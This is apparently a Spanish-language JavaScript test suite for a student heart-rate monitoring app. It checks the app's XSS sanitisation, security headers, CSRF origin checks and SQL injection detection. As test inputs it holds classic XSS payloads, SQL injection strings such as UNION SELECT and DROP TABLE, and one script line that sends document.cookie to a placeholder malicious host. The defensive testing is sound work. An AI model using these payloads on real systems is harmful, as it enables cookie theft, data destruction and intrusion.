import assert from 'assert'
import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'
import {
  escaparHtml,
  desescaparHtml,
  escaparAtributoHtml,
  sanitizarContenidoUsuario,
  esUrlSegura,
  contieneCodigoPeligroso,
  esOrigenPermitido,
  validarOrigenCsrf,
  esUuidValido,
  detectarIntentoInyeccionSql,
  aplicarCabecerasSeguridad,
  verificarCabecerasSeguridad,
  CABECERAS_SEGURIDAD_OFICIALES,
  CABECERAS_API_SEGURIDAD,
  proteccionWebService
} from '../src/services/proteccionWebService.js'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
const ROOT = path.resolve(__dirname, '..')

console.log('================================================================')
console.log('  sensor_pulso · Pruebas Automatizadas de RF68')
console.log('  Protección contra XSS, CSRF e Inyección, con Cabeceras de Seguridad')
console.log('================================================================\n')

let pasadas = 0
let falladas = 0

function test(nombre, fn) {
  try {
    fn()
    console.log(`  ✅ [PASS] ${nombre}`)
    pasadas++
  } catch (err) {
    console.error(`  ❌ [FAIL] ${nombre}`)
    console.error(`     Detalle: ${err.message}\n`)
    falladas++
  }
}

async function testAsync(nombre, fn) {
  try {
    await fn()
    console.log(`  ✅ [PASS] ${nombre}`)
    pasadas++
  } catch (err) {
    console.error(`  ❌ [FAIL] ${nombre}`)
    console.error(`     Detalle: ${err.message}\n`)
    falladas++
  }
}

async function ejecutarPruebas() {
  // --------------------------------------------------------------------------
  // 1. ESCAPADO DE CONTENIDO DE USUARIO Y PROTECCIÓN CONTRA XSS (Criterio 1)
  // --------------------------------------------------------------------------
  console.log('--- 1. Escapado de Contenido de Usuario y Prevención de XSS (Criterio 1) ---')

  test('XSS: escaparHtml neutraliza etiquetas <script> y las convierte en entidades seguras', () => {
    const payload = '<script>alert("XSS")</script>'
    const escapado = escaparHtml(payload)
    assert.strictEqual(escapado, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;')
    assert(!escapado.includes('<script>'), 'No debe contener la etiqueta script viva')
  })

  test('XSS: escaparHtml escapa caracteres críticos (&, <, >, ", \', /, `)', () => {
    const entrada = '& < > " \' / `'
    const escapado = escaparHtml(entrada)
    assert.strictEqual(escapado, '&amp; &lt; &gt; &quot; &#x27; &#x2F; &#x60;')
    assert.strictEqual(desescaparHtml(escapado), entrada, 'desescaparHtml debe recuperar el texto original')
  })

  test('XSS: escaparAtributoHtml protege inyecciones en atributos HTML (comillas y delimitadores)', () => {
    const payload = '" onfocus="alert(1)" x="'
    const escapado = escaparAtributoHtml(payload)
    assert(escapado.includes('&quot;'), 'Debe escapar las comillas dobles')
    assert(!escapado.includes('" onfocus'), 'No debe permitir salir del atributo')
  })

  test('XSS: sanitizarContenidoUsuario elimina bloques <script>, <style> e <iframe>', () => {
    const sucio = 'Hola mundo <script>alert("hack")</script> <iframe>hack</iframe> fin'
    const limpio = sanitizarContenidoUsuario(sucio)
    assert.strictEqual(limpio, 'Hola mundo   fin')
    assert(!limpio.includes('script') && !limpio.includes('iframe'))
  })

  test('XSS: sanitizarContenidoUsuario elimina manejadores de eventos inline (onerror, onload, onclick)', () => {
    const payload1 = '<img src="invalido.jpg" onerror="alert(\'XSS\')" alt="foto">'
    const limpio1 = sanitizarContenidoUsuario(payload1)
    assert(!limpio1.toLowerCase().includes('onerror'), 'Debe eliminar el manejador onerror')

    const payload2 = '<button onclick="evilCode()">Click</button>'
    const limpio2 = sanitizarContenidoUsuario(payload2)
    assert(!limpio2.toLowerCase().includes('onclick'), 'Debe eliminar el manejador onclick')
  })

  test('XSS: sanitizarContenidoUsuario elimina pseudoprotocolos peligrosos (javascript:, vbscript:, data:)', () => {
    const payload = '<a href="javascript:alert(1)">Enlace</a>'
    const limpio = sanitizarContenidoUsuario(payload)
    assert(!limpio.toLowerCase().includes('javascript:'), 'Debe suprimir el pseudoprotocolo javascript:')
  })

  test('XSS: esUrlSegura solo autoriza esquemas legítimos y bloquea esquemas de ataque', () => {
    assert(esUrlSegura('https://sensorpulso.vercel.app/api/esp32/telemetria'), 'HTTPS legítimo debe ser seguro')
    assert(esUrlSegura('http://localhost:5173/medicion'), 'HTTP local debe ser seguro')
    assert(esUrlSegura('/comparacion'), 'Ruta relativa debe ser segura')
    assert(esUrlSegura('mailto:docente@unach.cl'), 'mailto legítimo debe ser seguro')

    assert(!esUrlSegura('javascript:alert(document.cookie)'), 'javascript: debe ser rechazado')
    assert(!esUrlSegura('vbscript:msgbox(1)'), 'vbscript: debe ser rechazado')
    assert(!esUrlSegura('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='), 'data:text/html debe ser rechazado')
  })

  test('XSS: contieneCodigoPeligroso detecta vectores maliciosos conocidos', () => {
    assert(contieneCodigoPeligroso('<script>alert(1)</script>'), 'Debe detectar etiqueta script')
    assert(contieneCodigoPeligroso('<img src=x onerror=alert(1)>'), 'Debe detectar evento onerror')
    assert(contieneCodigoPeligroso('<svg onload=alert(1)>'), 'Debe detectar evento svg onload')
    assert(contieneCodigoPeligroso('javascript:alert(1)'), 'Debe detectar pseudoprotocolo javascript')
    assert(!contieneCodigoPeligroso('Texto médico normal de estudiante 75 BPM'), 'Texto plano legítimo no es peligroso')
  })

  test('Criterio 1: Un texto con código no se ejecuta (Transformación a texto plano inerte)', () => {
    const codigoInyectado = '<script>fetch("https://malicioso.com?c="+document.cookie)</script>'
    const textoSeguro = escaparHtml(sanitizarContenidoUsuario(codigoInyectado))
    // Al no contener etiquetas ejecutables y tener las entidades escapadas, un navegador lo muestra como texto inofensivo
    assert(!textoSeguro.includes('<script>'), 'El texto no debe contener código HTML ejecutable')
    assert(textoSeguro.includes('&lt;') || textoSeguro === '', 'Los caracteres especiales deben estar inertes')
  })

  // --------------------------------------------------------------------------
  // 2. CABECERAS DE SEGURIDAD ACTIVAS (Criterio 2)
  // --------------------------------------------------------------------------
  console.log('\n--- 2. Cabeceras de Seguridad Web (CSP y Similares) (Criterio 2) ---')

  const vercelPath = path.join(ROOT, 'vercel.json')
  const vercelJson = JSON.parse(fs.readFileSync(vercelPath, 'utf8'))
  const globalHeaders = vercelJson.headers.find(h => h.source === '/(.*)')?.headers || []
  const headersMap = Object.fromEntries(globalHeaders.map(h => [h.key, h.value]))

  test('Vercel: Strict-Transport-Security (HSTS) activa con max-age >= 1 año, includeSubDomains y preload', () => {
    const hsts = headersMap['Strict-Transport-Security']
    assert(hsts, 'Falta Strict-Transport-Security en vercel.json')
    assert(hsts.includes('max-age='), 'Debe incluir directiva max-age')
    const maxAge = parseInt(hsts.match(/max-age=(\d+)/)[1], 10)
    assert(maxAge >= 31536000, 'max-age debe ser de al menos 1 año (31536000 segundos)')
    assert(hsts.includes('includeSubDomains'), 'Debe incluir includeSubDomains')
    assert(hsts.includes('preload'), 'Debe incluir preload')
  })

  test('Vercel: Content-Security-Policy (CSP) activa con directivas estrictas', () => {
    const csp = headersMap['Content-Security-Policy']
    assert(csp, 'Falta Content-Security-Policy en vercel.json')
    assert(csp.includes("default-src 'self'"), "CSP debe incluir default-src 'self'")
    assert(csp.includes("frame-ancestors 'none'"), 'CSP debe bloquear incrustación en iframes (anti-clickjacking)')
    assert(csp.includes("object-src 'none'"), "CSP debe incluir object-src 'none' (anti-plugins antiguos)")
    assert(csp.includes('upgrade-insecure-requests'), 'CSP debe forzar upgrade a HTTPS')
  })

  test('Vercel: X-Content-Type-Options: nosniff activa (anti-MIME-sniffing)', () => {
    assert.strictEqual(headersMap['X-Content-Type-Options'], 'nosniff')
  })

  test('Vercel: X-Frame-Options: DENY activa (anti-clickjacking)', () => {
    assert.strictEqual(headersMap['X-Frame-Options'], 'DENY')
  })

  test('Vercel: Referrer-Policy: strict-origin-when-cross-origin activa', () => {
    assert.strictEqual(headersMap['Referrer-Policy'], 'strict-origin-when-cross-origin')
  })

  test('Vercel: Cross-Origin-Resource-Policy y Permissions-Policy configuradas', () => {
    assert(headersMap['Permissions-Policy'], 'Falta Permissions-Policy en vercel.json')
    assert(headersMap['Permissions-Policy'].includes('camera=()'), 'Debe restringir cámara')
    assert(headersMap['Permissions-Policy'].includes('microphone=()'), 'Debe restringir micrófono')
    assert(headersMap['Cross-Origin-Resource-Policy'] === 'same-origin', 'Debe configurar CORP same-origin')
  })

  test('API Serverless: aplicarCabecerasSeguridad inyecta cabeceras oficiales en respuestas HTTP', () => {
    const headersMock = {}
    const resMock = {
      setHeader: (k, v) => { headersMock[k] = v }
    }
    aplicarCabecerasSeguridad(resMock, 'api')

    assert.strictEqual(headersMock['X-Content-Type-Options'], 'nosniff')
    assert.strictEqual(headersMock['X-Frame-Options'], 'DENY')
    assert(headersMock['Strict-Transport-Security'].includes('max-age='))
    assert.strictEqual(headersMock['Content-Security-Policy'], "default-src 'none'; frame-ancestors 'none'")
  })

  test('Criterio 2: Las cabeceras de seguridad están activas (evaluación completa de verificación)', () => {
    const resultado = verificarCabecerasSeguridad(headersMap)
    assert(resultado.validas, `Faltan cabeceras de seguridad obligatorias: ${resultado.faltantes.join(', ')}`)
  })

  // --------------------------------------------------------------------------
  // 3. PROTECCIÓN CONTRA CSRF (Cross-Site Request Forgery)
  // --------------------------------------------------------------------------
  console.log('\n--- 3. Protección contra CSRF en Solicitudes Mutables (API) ---')

  test('CSRF: Métodos de solo lectura (GET, HEAD, OPTIONS) no son bloqueados por CSRF', () => {
    const resGet = validarOrigenCsrf({ method: 'GET' })
    assert.strictEqual(resGet.permitido, true)

    const resOptions = validarOrigenCsrf({ method: 'OPTIONS' })
    assert.strictEqual(resOptions.permitido, true)
  })

  test('CSRF: Solicitud POST desde origen malicioso no autorizado es rechazada con HTTP 403', () => {
    const reqMaliciosa = {
      method: 'POST',
      headers: {
        origin: 'https://sitio-malicioso-phishing.com'
      }
    }
    const resultado = validarOrigenCsrf(reqMaliciosa)
    assert.strictEqual(resultado.permitido, false, 'El origen malicioso debe ser bloqueado')
    assert.strictEqual(resultado.codigo, 403, 'Debe retornar código HTTP 403 Forbidden')
    assert(resultado.error.includes('CSRF'), 'El mensaje debe indicar rechazo por CSRF')
  })

  test('CSRF: Solicitud POST desde origen legítimo (Vercel o localhost) es autorizada', () => {
    const reqVercel = {
      method: 'POST',
      headers: { origin: 'https://sensorpulso.vercel.app' }
    }
    assert.strictEqual(validarOrigenCsrf(reqVercel).permitido, true)

    const reqLocal = {
      method: 'POST',
      headers: { origin: 'http://localhost:5173' }
    }
    assert.strictEqual(validarOrigenCsrf(reqLocal).permitido, true)
  })

  test('CSRF: Solicitud M2M de telemetría de ESP32 con cabecera X-ESP32-Token es autorizada', () => {
    const reqEsp32 = {
      method: 'POST',
      headers: {
        'x-esp32-token': 'esp_demotoken_unach_2026_rf05'
      }
    }
    const res = validarOrigenCsrf(reqEsp32)
    assert.strictEqual(res.permitido, true)
    assert.strictEqual(res.tipo, 'esp32_m2m')
  })

  test('CSRF: Solicitud con token Bearer Authorization es autorizada', () => {
    const reqBearer = {
      method: 'POST',
      headers: {
        authorization: 'Bearer jwt_token_valido_unach'
      }
    }
    const res = validarOrigenCsrf(reqBearer)
    assert.strictEqual(res.permitido, true)
    assert.strictEqual(res.tipo, 'bearer_token')
  })

  // --------------------------------------------------------------------------
  // 4. REVISIÓN Y PROTECCIÓN CONTRA INYECCIÓN SQL
  // --------------------------------------------------------------------------
  console.log('\n--- 4. Revisión y Protección contra Inyección SQL ---')

  test('SQL Injection: esUuidValido rechaza identificadores con inyecciones SQL', () => {
    assert(esUuidValido('a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11'), 'UUID legítimo debe ser válido')
    assert(!esUuidValido("' OR '1'='1"), 'Inyección OR debe ser rechazada')
    assert(!esUuidValido("a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11'; DROP TABLE usuarios; --"), 'Inyección con DROP TABLE debe ser rechazada')
  })

  test('SQL Injection: detectarIntentoInyeccionSql detecta patrones clásicos de inyección', () => {
    assert(detectarIntentoInyeccionSql("' OR 1=1 --"), 'Debe detectar OR 1=1')
    assert(detectarIntentoInyeccionSql("admin' UNION SELECT null, email, password FROM auth.users --"), 'Debe detectar UNION SELECT')
    assert(detectarIntentoInyeccionSql("1; DROP TABLE perfiles; --"), 'Debe detectar DROP TABLE')
    assert(detectarIntentoInyeccionSql("test /* comentario sql */"), 'Debe detectar comentarios SQL')
    assert(!detectarIntentoInyeccionSql('Juan Pérez Docente'), 'Texto normal no debe dar falso positivo')
  })

  test('SQL Injection: Auditoría estática confirma que no hay consultas SQL concatenadas en src/services', () => {
    const servicesDir = path.join(ROOT, 'src', 'services')
    const files = fs.readdirSync(servicesDir).filter(f => f.endsWith('.js'))

    for (const file of files) {
      const code = fs.readFileSync(path.join(servicesDir, file), 'utf8')
      assert(!code.includes("execute('") && !code.includes('execute("'), `Archivo ${file} no debe contener execute crudo`)
      assert(!code.includes('query(`SELECT') && !code.includes('query("SELECT'), `Archivo ${file} no debe concatenar queries SQL crudas`)
    }
  })

  // --------------------------------------------------------------------------
  // 5. INTEGRACIÓN EN ENDPOINTS Y SERVICIOS DEL SISTEMA
  // --------------------------------------------------------------------------
  console.log('\n--- 5. Integración en Endpoints y Servicios del Sistema ---')

  const apiInvitacionesPath = path.join(ROOT, 'api', 'invitaciones', 'enviar.js')
  const apiInvitacionesCode = fs.readFileSync(apiInvitacionesPath, 'utf8')

  test('api/invitaciones/enviar.js: Aplica escaparHtml a variables del usuario en la plantilla de correo', () => {
    assert(apiInvitacionesCode.includes('escaparHtml(nombreAula)'), 'Debe escapar el nombre del aula')
    assert(apiInvitacionesCode.includes('escaparHtml(nombreDocente)'), 'Debe escapar el nombre del docente')
    assert(apiInvitacionesCode.includes('validarOrigenCsrf'), 'Debe validar el origen contra CSRF')
    assert(apiInvitacionesCode.includes('aplicarCabecerasSeguridad'), 'Debe aplicar cabeceras de seguridad activas')
  })

  const apiTelemetriaPath = path.join(ROOT, 'api', 'esp32', 'telemetria.js')
  const apiTelemetriaCode = fs.readFileSync(apiTelemetriaPath, 'utf8')

  test('api/esp32/telemetria.js: Aplica cabeceras de seguridad completas y validación CSRF', () => {
    assert(apiTelemetriaCode.includes('aplicarCabecerasSeguridad'), 'Debe invocar aplicarCabecerasSeguridad')
    assert(apiTelemetriaCode.includes('validarOrigenCsrf'), 'Debe invocar validarOrigenCsrf en peticiones mutables')
  })

  const aulasServicePath = path.join(ROOT, 'src', 'services', 'aulasService.js')
  const aulasServiceCode = fs.readFileSync(aulasServicePath, 'utf8')

  test('src/services/aulasService.js: Sanitiza y escapa nombres y descripciones en crearAula y crearCurso', () => {
    assert(aulasServiceCode.includes('escaparHtml(sanitizarContenidoUsuario(nombre'), 'crearAula debe escapar y sanitizar nombre')
    assert(aulasServiceCode.includes('escaparHtml(sanitizarContenidoUsuario(descripcion'), 'crearAula debe escapar y sanitizar descripcion')
  })

  console.log('\n================================================================')
  console.log(`  RESUMEN DE PRUEBAS RF68:`)
  console.log(`  Total: ${pasadas + falladas} | Pasadas: ${pasadas} | Falladas: ${falladas}`)
  console.log('================================================================\n')

  if (falladas > 0) {
    process.exit(1)
  }
}

ejecutarPruebas().catch(err => {
  console.error('Error no capturado en pruebas:', err)
  process.exit(1)
})
